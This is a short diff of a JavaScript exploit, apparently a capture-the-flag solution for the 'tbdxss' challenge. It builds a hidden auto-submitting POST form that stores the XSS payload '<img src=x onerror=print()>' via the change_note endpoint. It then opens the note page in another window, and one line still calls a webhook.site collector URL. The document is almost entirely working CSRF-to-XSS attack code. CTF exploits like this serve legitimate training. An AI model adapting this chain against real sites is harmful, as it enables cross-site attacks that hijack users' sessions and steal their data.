@@ -18,13 +18,13 @@
 
       var form = document.createElement("form");
       form.target = uniqueString;
-      form.action = "https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953/form";
+      form.action = "https://tbdxss.chal.perfect.blue/change_note";
       form.method = "POST";
 
       var input = document.createElement("input");
       input.type = "hidden";
       input.name = "data";
-      input.value ="Something" ;
+      input.value ="<img src=x onerror=print()>" ;
       form.appendChild(input);
 
       document.body.appendChild(form);
@@ -35,9 +35,9 @@
 
   document.addEventListener("DOMContentLoaded", function (event) {
     setTimeout(function () {
-      user.location = 'https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953/note' // loads a ifrane with notes 
+      user.location = 'https://tbdxss.chal.perfect.blue/note' // loads a ifrane with notes 
       setTimeout(function () {
-        window.open('https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953/note1'); // open the window with xss we se before ( note )
+        window.open('https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953/note'); // open the window with xss we se before ( note )
 
       }, 2000);
 
